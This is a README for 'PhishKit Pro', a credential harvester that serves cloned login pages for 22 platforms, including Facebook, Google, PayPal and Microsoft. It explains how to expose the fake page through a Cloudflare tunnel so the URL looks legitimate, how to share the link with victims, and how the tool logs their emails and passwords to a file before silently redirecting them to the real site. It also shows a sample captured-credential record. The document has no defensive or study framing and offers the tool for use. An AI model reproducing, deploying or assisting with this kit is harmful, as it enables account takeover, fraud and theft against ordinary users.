# PhishKit Pro — Multi-Platform Credential Harvester

22 platforms. Local + Cloudflare tunnel. Cloned login pages.

---

## Platforms

| # | Platform      | # | Platform    |
|---|---------------|---|-------------|
| 1 | Facebook      | 12 | PayPal     |
| 2 | Instagram     | 13 | Amazon     |
| 3 | Google        | 14 | Microsoft  |
| 4 | YouTube       | 15 | Apple ID   |
| 5 | Twitter / X   | 16 | Discord    |
| 6 | TikTok        | 17 | Telegram   |
| 7 | Snapchat      | 18 | Reddit     |
| 8 | LinkedIn      | 19 | GitHub     |
| 9 | WhatsApp Web  | 20 | Steam      |
| 10 | Netflix      | 21 | Twitch     |
| 11 | Spotify      | 22 | Pinterest  |

---

## Requirements

- Python 3.8+
- pip packages: `flask`, `colorama`, `requests`
- For Cloudflare tunnel: `cloudflared` binary

---

## Install

```bash
pip install -r requirements.txt
```

For Cloudflare tunnel (optional):
- Download from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation
- Windows: download `cloudflared-windows-amd64.exe`, rename to `cloudflared.exe`, place in same folder or PATH
- Linux: `curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared && chmod +x cloudflared && sudo mv cloudflared /usr/local/bin`

---

## Run

```bash
python phisher.py
```

---

## Usage Flow

```
1. Run the script
2. Select platform number (1-22)
3. Set port (default: 8080)
4. Choose tunnel mode:
   [1] Local Network — share your LAN IP:PORT
   [2] Cloudflare   — get a *.trycloudflare.com public URL
5. Share the link
6. Credentials appear in terminal + saved to: captured_creds.txt
```

---

## How It Works

- Flask server serves a pixel-perfect clone of the selected platform's login page
- Victim submits credentials → captured and logged to `captured_creds.txt`
- Victim is silently redirected to the real platform (no suspicion)
- Cloudflare tunnel gives a legit-looking HTTPS URL without port forwarding

---

## Captured Credentials Format

```
============================================================
[2024-03-15 14:32:07] PLATFORM: Facebook
IP      : 192.168.1.105
EMAIL     : victim@email.com
PASSWORD  : hunter2
============================================================
```

---

## Notes

- Cloudflare tunnel requires `cloudflared` in PATH or same directory
- Each run picks ONE platform — restart to switch
- Runs on 0.0.0.0 so accessible from any device on the network
- Ctrl+C to stop server and tunnel
